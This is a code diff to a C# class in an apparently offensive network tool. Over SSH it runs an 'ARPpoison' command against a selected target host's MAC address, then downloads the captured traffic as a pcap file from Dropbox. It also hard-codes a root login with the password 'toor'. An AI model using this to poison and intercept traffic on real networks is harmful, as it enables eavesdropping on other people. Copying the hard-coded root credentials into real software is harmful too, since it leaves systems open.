@@ -10,11 +10,14 @@ using System.Web;
 using Dropbox.Api;
 using Dropbox.Api.Files;
 using Renci.SshNet;
+using Renci.SshNet.Common;
 
 namespace EniacSpi.Objects
 {
     public class Host : IHost
     {
+        private ConnectionInfo connectionInfo;
+
         public Host(Socket socket, string name)
         {
             this.Socket = socket;
@@ -27,7 +30,7 @@ namespace EniacSpi.Objects
             this.SelectedNetwork = AvailableNetworks.FirstOrDefault();
             AvailableTargetHosts.Add(new HostInformation { MAC = "TEST-AABBCC-DD1235" });
 
-            this.SshClient= new SshClient(new ConnectionInfo("192.168.2.14", 22, "root", new PasswordAuthenticationMethod("root", "toor")));
+            this.connectionInfo = new ConnectionInfo("192.168.2.14", 22, "root", new PasswordAuthenticationMethod("root", "toor"));
             StartPoison();
         }
 
@@ -42,8 +45,6 @@ namespace EniacSpi.Objects
                 return "test";
             }
         }
-
-        public SshClient SshClient { get; set; }
 
         public IList<INetworkInformation> AvailableNetworks { get; }
 
@@ -93,15 +94,32 @@ namespace EniacSpi.Objects
 
         public bool IsCracking { get; set; }
 
-        public async Task StartPoison()
+        public string StartPoison()
         {
-            this.SshClient.Connect();
-            var command = this.SshClient.CreateCommand(String.Format("EniacSpi ARPpoison {0} {1}", this.SelectedTargetHost.MAC, this.SelectedNetwork.MAC));
-            var result = command.Result;
+            using (SshClient client = new SshClient(this.connectionInfo))
+            {
+                try
+                {
+                    client.Connect();
+                    var result = client.CreateCommand(String.Format("EniacSpi ARPpoison {0} {1}", this.SelectedTargetHost.MAC, this.SelectedNetwork.MAC)).Execute();
+                    client.Disconnect();
+                }
+                catch (SocketException ex)
+                {
+                    return $"{ex.HResult}: Target machine actively refused SSH connection";
+                }
+                catch (SshAuthenticationException ex)
+                {
+                    return $"{ex.HResult}: Failed to authenticate SSH request";
+                }
+                catch (Exception ex)
+                {
+                    return $"{ex.HResult}: Failed to start Poison attack";
+                }
+            }
 
             DropboxEvents.OnDropboxChanged(TargetHostTrafficReceived);
-
-            this.SshClient.Disconnect();
+            return "Success";
         }
 
         private async void TargetHostTrafficReceived()
@@ -110,16 +128,11 @@ namespace EniacSpi.Objects
             try
             {
                 var response = await dropboxClient.Files.DownloadAsync(new Dropbox.Api.Files.DownloadArg(String.Format("/{0}/{1}/package.pcap", this.Name, this.SelectedNetwork.MAC)));
-
                 Stream fileStream = await response.GetContentAsStreamAsync();
 
                 //do pcap parsing and SignalR here
 
                 fileStream.Close();
-            }
-            catch (ApiException<DownloadError.Path> ex)
-            {
-                return;
             }
             catch (Exception ex)
             {
